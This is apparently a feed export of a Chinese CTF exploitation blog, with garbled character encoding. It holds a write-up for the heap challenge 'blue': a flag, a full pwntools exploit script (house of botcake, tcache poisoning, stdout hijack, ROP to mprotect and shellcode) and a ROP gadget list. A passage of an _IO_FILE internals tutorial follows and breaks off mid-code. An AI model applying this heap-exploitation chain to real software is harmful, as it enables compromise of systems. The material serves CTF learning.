; ret</span><br><span class="hljs-string">0x00000000001574e6 : pop rdx ; pop rbx ; ret</span><br><span class="hljs-string">0x00000000000fc103 : pop rdx ; pop rcx ; pop rbx ; ret</span><br><span class="hljs-string">0x00000000000c7f32 : pop rdx ; ret</span><br><span class="hljs-string">0x0000000000095982 : pop rdx ; ret 0x11</span><br><span class="hljs-string">0x0000000000093342 : pop rdx ; ret 0xfffc</span><br><span class="hljs-string">0x0000000000028db0 : pop rsi ; pop r15 ; pop rbp ; ret</span><br><span class="hljs-string">0x0000000000028a53 : pop rsi ; pop r15 ; ret</span><br><span class="hljs-string">0x000000000002a4cf : pop rsi ; ret</span><br><span class="hljs-string">0x0000000000028dac : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</span><br><span class="hljs-string">0x0000000000028a4f : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="hljs-string">0x000000000002a4cb : pop rsp ; pop r13 ; pop r14 ; ret</span><br><span class="hljs-string">0x0000000000043922 : pop rsp ; pop r13 ; pop rbp ; ret</span><br><span class="hljs-string">0x000000000002a04c : pop rsp ; pop r13 ; ret</span><br><span class="hljs-string">0x00000000000de0e6 : pop rsp ; pop rbp ; ret</span><br><span class="hljs-string">0x0000000000033af2 : pop rsp ; ret</span><br><span class="hljs-string">0x0000000000026699 : ret</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="blue"><a class="header-anchor" href="#blue">Â¶</a>blue</h2><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220619194659319.png" alt="image-20220619194659319"></p><p><strong>flag{8c65b8bd2169f2cf662ae9e324aaef66}</strong></p><p>Ubuntu GLIBC 2.31-0ubuntu9.8 çš„å †é¢˜ï¼ŒIO jumps æ®µä¸å¯å†™ï¼Œæ²¡æœ‰åŠæ³•æŒ‰ä¼ ç»Ÿæ€è·¯èµ°ã€‚</p><p><strong>æ€è·¯</strong></p><ol><li>åˆ©ç”¨åé—¨å‡½æ•°ï¼Œç±»ä¼¼ House of botcake çš„æ‰‹æ³•å®Œæˆå †å—é‡å çš„åŒæ—¶ leak å‡º libcã€‚</li><li>æ”»å‡» Stdout Leak æ ˆåœ°å€</li><li>å¡ ROP</li></ol><p><strong>Exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">c</span>):<br>    sla(<span class="hljs-string">&#x27;Choice: &#x27;</span>,<span class="hljs-built_in">str</span>(c))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size=<span class="hljs-number">0x80</span>,data=<span class="hljs-string">&#x27;u&#x27;</span></span>):<br>    menu(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&#x27;Please input size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sea(<span class="hljs-string">&#x27;Please input content: &#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;Please input idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&#x27;Please input idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bkdoor</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">666</span>)<br>    sla(<span class="hljs-string">&#x27;Please input idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    add()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    dele(<span class="hljs-number">10</span>-<span class="hljs-number">1</span>-i)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] House of botcake</span><br><span class="hljs-string">[*] Double Free --&gt; Modify chunk&#x27;s size --&gt; Chunk Overlapping</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>bkdoor(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x1ecbe0</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>libc.address = libc_base<br>stdout = libc_base + <span class="hljs-number">0x1ed6a0</span><br>stack_addr = libc.sym.environ<br>ret = libc_base + <span class="hljs-number">0x0000000000022679</span><br>rdi = libc_base +<span class="hljs-number">0x0000000000023b6a</span><br>rsi = libc_base + <span class="hljs-number">0x000000000002601f</span><br>rdx_r12 = libc_base + <span class="hljs-number">0x0000000000119211</span><br>jmp_rsi = libc_base + <span class="hljs-number">0x000000000010d5dd</span><br><br>dele(<span class="hljs-number">0</span>)<br>add() <span class="hljs-comment"># 0</span><br><br>add(<span class="hljs-number">0x90</span>,<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x88</span>+p32(<span class="hljs-number">0x90</span>*<span class="hljs-number">8</span>+<span class="hljs-number">1</span>)) <span class="hljs-comment"># 3</span><br>add(<span class="hljs-number">0x70</span>) <span class="hljs-comment"># 4</span><br>dele(<span class="hljs-number">1</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] Tcache Poisoning --&gt; Hijack Stdout --&gt; leak environ addr</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x50</span>) <span class="hljs-comment"># 1</span><br>add(<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x28</span>+p64(<span class="hljs-number">0x91</span>)+p64(stdout)+p64(<span class="hljs-number">0</span>)) <span class="hljs-comment"># 2</span><br>add() <span class="hljs-comment"># 5</span><br>add(<span class="hljs-number">0x80</span>,p64(<span class="hljs-number">0xfbad1800</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(stack_addr)+p64(stack_addr+<span class="hljs-number">8</span>)*<span class="hljs-number">2</span>) <span class="hljs-comment"># 6</span><br>stack_addr = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>lg(<span class="hljs-string">&#x27;stack_addr&#x27;</span>,stack_addr)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] Tcache Poinsoning --&gt; Hijack Stack --&gt; ROP --&gt; Shellcode</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">5</span>)<br>dele(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x28</span>+p64(<span class="hljs-number">0x91</span>)+p64(stack_addr-<span class="hljs-number">0x120</span>)+p64(<span class="hljs-number">0</span>)) <span class="hljs-comment"># 2</span><br>add() <span class="hljs-comment"># 5</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[~] Gets to input more data (Optional)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload = flat([<br>    rdi,stack_addr-<span class="hljs-number">0x108</span>,libc.sym.gets<br>])<br>add(<span class="hljs-number">0x80</span>,payload) <span class="hljs-comment"># 7</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] Enable Shellcode</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>mmp = flat([<br>    rdi,((stack_addr)&gt;&gt;<span class="hljs-number">12</span>)&lt;&lt;<span class="hljs-number">12</span>,rsi,<span class="hljs-number">0x2000</span>,rdx_r12,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,libc.sym.mprotect,rdi,<span class="hljs-number">0</span>,rsi,stack_addr,rdx_r12,<span class="hljs-number">0x100</span>,<span class="hljs-number">0</span>,libc.sym.read,jmp_rsi<br>])<br>sleep(<span class="hljs-number">0.5</span>)<br>sl(mmp)<br>sleep(<span class="hljs-number">0.5</span>)<br>sl(asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>)))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>_IO_FILE è‰ºæœ¯é‰´èµ</title>
    <link href="/posts/13285c73.html"/>
    <url>/posts/13285c73.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>é¡ºé£çå‡ æŠŠ ğŸ‘ ï¼Œç»å¢ƒ IOFILEã€‚</p><footer><strong>ã€Š :sheep: ä¸é :sheep: ã€‹</strong></footer></blockquote><p>ğŸ‘´ å¤ªå–œæ¬¢è¿™ä¸ª IO ç©æ„äº†ï¼Œæ— æ•Œå¸…ã€‚ğŸ‘´ å•æ–¹é¢å®£å¸ƒ <strong>IO</strong> æ˜¯ glibc å”¯ä¸€çœŸç¥ã€‚</p><p>æ„Ÿè°¢ <strong>é£æ²äº‘çƒŸ</strong> å¸ˆå‚…æ•™æˆ‘çš„ IO ä¸€æ•´æ¡åˆ©ç”¨è·¯çº¿å’Œè€å¿ƒè§£ç­”ï¼Œ<strong>é£æ²æ²</strong> æˆ‘æ»´è¶…äººã€‚</p><h1>åŸºç¡€çŸ¥è¯†å­¦ä¹ </h1><h2 id="IO-FILEä¸»è¦ç»“æ„"><a class="header-anchor" href="#IO-FILEä¸»è¦ç»“æ„">Â¶</a>_IO_FILEä¸»è¦ç»“æ„</h2><h3 id="IO-FILE-plus"><a class="header-anchor" href="#IO-FILE-plus">Â¶</a>_IO_FILE_plus</h3><p>é¦–å…ˆæ˜¯_IO_FILE_plusï¼Œæ¯ä¸ª _IO_FILE ç»“æ„ä½“éƒ½è¢«åŒ…å«åœ¨ä¸€ä¸ª _IO_FILE_plus ç»“æ„ä½“ä¹‹ä¸­ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span></span><br><span class="hljs-class">&#123;</span><br>  FILE file;<br>  <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> *<span class="hljs-title">vtable</span>;</span><span class="hljs-comment">//è™šå‡½æ•°è¡¨</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­çš„ vtable æ˜¯æŒ‡å‘ä¸€ç³»åˆ—å‡½æ•°çš„ä¸€å¼ è¡¨ï¼Œ _IO_jump_t ç»“æ„ä½“ç»“æ„å¦‚ä¸‹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span></span><br><span class="hljs-class">&#123;</span><br>    JUMP_FIELD(<span class="hljs-type">size_t</span>, __dummy);<br>    JUMP_FIELD(<span class="hljs-type">size_t</span>, __dummy2);<br>    JUMP_FIELD(_IO_finish_t, __finish);<br>    JUMP_FIELD(_IO_overflow_t, __overflow);<br>    JUMP_FIELD(_IO_underflow_t, __underflow);<br>    JUMP_FIELD(_IO_underflow_t, __uflow);<br>    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);<br>    <span class="hljs-comment">/* showmany */</span><br>    JUMP_FIELD(_IO_xsputn_t, __xsputn);<br>    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);<br>    JUMP_FIELD(_IO_seekoff_t, __seekoff);<br>    JUMP_FIELD(_IO_seekpos_t, __seekpos);<br>    JUMP_FIELD(_IO_setbuf_t, __setbuf);<br>    JUMP_FIELD(_IO_sync_t, __sync);<br>    JUMP_FIELD(_IO_doallocate_t, __doallocate);<br>    JUMP_FIELD(_IO_read_t, __read);<br>    JUMP_FIELD(_IO_write_t, __write);<br>    JUMP_FIELD(_IO_seek_t, __seek);<br>    JUMP_FIELD(_IO_close_t, __close);<br>    JUMP_FIELD(_IO_stat_t, __stat);<br>    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);<br>    JUMP_FIELD(_IO_imbue_t, __imbue);<br>&#125;;<br><br><span class="hljs-comment">/* We always allocate an extra word following an _IO_FILE.</span><br><span class="hljs-comment">   This contains a pointer to the function jump table used.</span><br><span class="hljs-comment">   This is for compatibility with C++ streambuf; the word can</span><br><span class="hljs-comment">   be used to smash to a pointer to a virtual function table. */</span><br></code></pre></td></tr></table></figure><h3 id="FILE"><a class="header-anchor" href="#FILE">Â¶</a>FILE</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> &#123;</span><br>  <span class="hljs-type">int</span> _flags;       <span class="hljs-comment">/* High-order word is _IO_MAGIC; rest is flags. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_file_flags _flags</span><br><br>  <span class="hljs-comment">/* The following pointers correspond to the C++ streambuf protocol. */</span><br>  <span class="hljs-comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span><br>  <span class="hljs-type">char</span>* _IO_read_ptr;   <span class="hljs-comment">/* Current read pointer */</span><br>  <span class="hljs-type">char</span>* _IO_read_end;   <span class="hljs-comment">/* End of get area. */</span><br>  <span class="hljs-type">char</span>* _IO_read_base;  <span class="hljs-comment">/* Start of putback+get area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_base; <span class="hljs-comment">/* Start of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_ptr;  <span class="hljs-comment">/* Current put pointer. */</span><br>  <span class="hljs-type">char</span>* _IO_write_end;  <span class="hljs-comment">/* End of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_base;   <span class="hljs-comment">/* Start of reserve area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_end;    <span class="hljs-comment">/* End of reserve area. */</span><br>  <span class="hljs-comment">/* The following fields are used to support backing up and undo. */</span><br>  <span class="hljs-type">char</span> *_IO_save_base; <span class="hljs-comment">/* Pointer to start of non-current get area. */</span><br>  <span class="hljs-type">char</span> *_IO_backup_base;  <span class="hljs-comment">/* Pointer to first valid character of backup area */</span><br>  <span class="hljs-type">char</span> *_IO_save_end; <span class="hljs-comment">/* Pointer to end of non-current get area. */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span> *_<span class="hljs-title">markers</span>;</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">chain</span>;</span><br><br>  <span class="hljs-type">int</span> _fileno;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> 0</span><br>  <span class="hljs-type">int</span> _blksize;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  <span class="hljs-type">int</span> _flags2;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  _IO_off_t _old_offset; <span class="hljs-comment">/* This used to be _offset but it&#x27;s too small.  */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __HAVE_COLUMN <span class="hljs-comment">/* temporary */</span></span><br>  <span class="hljs-comment">/* 1+column number of pbase(); 0 is unknown. */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> _cur_column;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">char</span> _vtable_offset;<br>  <span class="hljs-type">char</span> _shortbuf[<span class="hljs-number">1</span>];<br><br>  <span class="hljs-comment">/*  char* _save_gptr;  char* _save_egptr; */</span><br><br>  _IO_lock_t *_lock;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span><br>&#125;;<br><br><span class="hljs-comment">/* We always allocate an extra word following an _IO_FILE.</span><br><span class="hljs-comment">   This contains a pointer to the function jump table used.</span><br><span class="hljs-comment">   This is for compatibility with C++ streambuf; the word can</span><br><span class="hljs-comment">   be used to smash to a pointer to a virtual function table. */</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span></span><br><span class="hljs-class">&#123;</span><br>  _IO_FILE file;<br>  <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> *<span class="hljs-title">vtable</span>;</span><br>&#125;;<br><br></code></pre></td></tr></table></figure><p>æ­¤å¤–ï¼Œé€šè¿‡ gdb æˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“çš„æŸ¥çœ‹æŸä¸ª FILE ç»“æ„ä½“å†…å®¹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; p/x _IO_2_1_stderr_<br>$<span class="hljs-number">1</span> = &#123;<br>  file = &#123;<br>    _flags = <span class="hljs-number">0xfbad2087</span>,<br>    _IO_read_ptr = <span class="hljs-number">0x7ffff7dce703</span>,<br>    _IO_read_end = <span class="hljs-number">0x7ffff7dce703</span>,<br>    _IO_read_base = <span class="hljs-number">0x7ffff7dce703</span>,<br>    _IO_write_base = <span class="hljs-number">0x7ffff7dce703</span>,<br>    _IO_write_ptr = <span class="hljs-number">0x7ffff7dce703</span>,<br>    _IO_write_end = <span class="hljs-number">0x7ffff7dce703</span>,<br>    _IO_buf_base = <span class="hljs-number">0x7ffff7dce703</span>,<br>    _IO_buf_end = <span class="hljs-number">0x7ffff7dce704</span>,<br>    _IO_save_base = <span class="hljs-number">0x0</span>,<br>    _IO_backup_base = <span class="hljs-number">0x0</span>,<br>    _IO_save_end = <span class="hljs-number">0x0</span>,<br>    _markers = <span class="hljs-number">0x0</span>,<br>    _chain = <span class="hljs-number">0x7ffff7dce760</span>,<br>    _fileno = <span class="hljs-number">0x2</span>,<br>    _flags2 = <span class="hljs-number">0x0</span>,<br>    _old_offset = <span class="hljs-number">0xffffffffffffffff</span>,<br>    _cur_column = <span class="hljs-number">0x0</span>,<br>    _vtable_offset = <span class="hljs-number">0x0</span>,<br>    _shortbuf = &#123;<span class="hljs-number">0x0</span>&#125;,<br>    _lock = <span class="hljs-number">0x7ffff7dcf8b0</span>,<br>    _offset = <span class="hljs-number">0xffffffffffffffff</span>,<br>    _codecvt = <span class="hljs-number">0x0</span>,<br>    _wide_data = <span class="hljs-number">0x7ffff7dcd780</span>,<br>    _freeres_list = <span class="hljs-number">0x0</span>,<br>    _freeres_buf = <span class="hljs-number">0x0</span>,<br>    __pad5 = <span class="hljs-number">0x0</span>,<br>    _mode = <span class="hljs-number">0x0</span>,<br>    _unused2 = &#123;<span class="hljs-number">0x0</span> &lt;repeats <span class="hljs-number">20</span> times&gt;&#125;<br>  &#125;,<br>  vtable = <span class="hljs-number">0x7ffff7dca2a0</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>_flags</strong> è¿™ä¸ªä½ç½®å…¶å®æ¯”è¾ƒå…³é”®ï¼Œåé¢æˆ‘ä»¬è¦å¼„æ¸…æ¥šæ€ä¹ˆè®¾ç½®çš„æ‰èƒ½è¿›å…¥æˆ‘ä»¬æƒ³è¦çš„å‡½æ•°ï¼Œå®Œæˆç›¸å…³åˆ©ç”¨ã€‚å½“ç„¶ä¼ªé€ çš„æ—¶å€™æˆ‘ä»¬éƒ½æ˜¯æ ¹æ®å…·ä½“å‡½æ•°æ¥ç²¾å¿ƒæ„é€ çš„ï¼Œä½†ç‰¹åˆ«å¥½ç”¨çš„æœ‰ä¿©ï¼š<code>0</code> å’Œ <code>0xfbad1800</code> ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_MAGIC 0xFBAD0000 <span class="hljs-comment">/* Magic number */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _OLD_STDIO_MAGIC 0xFABC0000 <span class="hljs-comment">/* Emulate old stdio. */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_MAGIC_MASK 0xFFFF0000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_USER_BUF 1 <span class="hljs-comment">/* User owns buffer; don&#x27;t delete it on close. */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_UNBUFFERED 2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_NO_READS 4 <span class="hljs-comment">/* Reading not allowed */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_NO_WRITES 8 <span class="hljs-comment">/* Writing not allowd */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_EOF_SEEN 0x10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_ERR_SEEN 0x20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_DELETE_DONT_CLOSE 0x40 <span class="hljs-comment">/* Don&#x27;t call close(_fileno) on cleanup. */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_LINKED 0x80 <span class="hljs-comment">/* Set if linked (using _chain) to streambuf::_list_all.*/</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_IN_BACKUP 0x100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_LINE_BUF 0x200</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_TIED_PUT_GET 0x400 <span class="hljs-comment">/* 